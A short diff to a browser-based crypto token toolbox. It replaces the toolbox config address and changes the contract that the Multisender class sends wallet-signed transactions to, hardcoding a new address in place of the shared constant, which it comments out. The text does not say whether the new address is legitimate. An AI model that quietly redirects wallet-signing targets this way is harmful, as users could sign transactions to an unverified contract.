@@ -1068,7 +1068,7 @@ const MULTISEND_ABI = [
 ];
 
 const INKY_TOOLBOX_CONFIG = {
-    ADDRESS: "0x6EB2C1fE4e3B48af4905A0209658810B61343438",
+    ADDRESS: "0xeA6c69B80e841249aE1919db92D3fb6332e568Ad",
     MIN_BALANCE_FOR_USE: 5000,
 };
 
@@ -1097,7 +1097,7 @@ const HONEYPOT_FUNCTIONS = {
     "setSwapAndLiquifyEnabled": "Owner can manipulate liquidity."
 };
 
-const MULTISEND_ADDRESS = "0x3f9c8E5df3DeEf77A8F8994f25FE23f8968e8C62";
+// const MULTISEND_ADDRESS = "0x817806794b5Fa0d7DF72555fcB327c54BBC5cfEA";
 const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
 
 // ===== GLOBAL VARIABLES =====
@@ -1924,7 +1924,7 @@ class Multisender {
             
             let tx;
 
-            const contractAddress = "0x3f9c8E5df3DeEf77A8F8994f25FE23f8968e8C62";
+            const contractAddress = "0x817806794b5Fa0d7DF72555fcB327c54BBC5cfEA";
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
             const multisendContract = new ethers.Contract(contractAddress, MULTISEND_ABI, signer); 
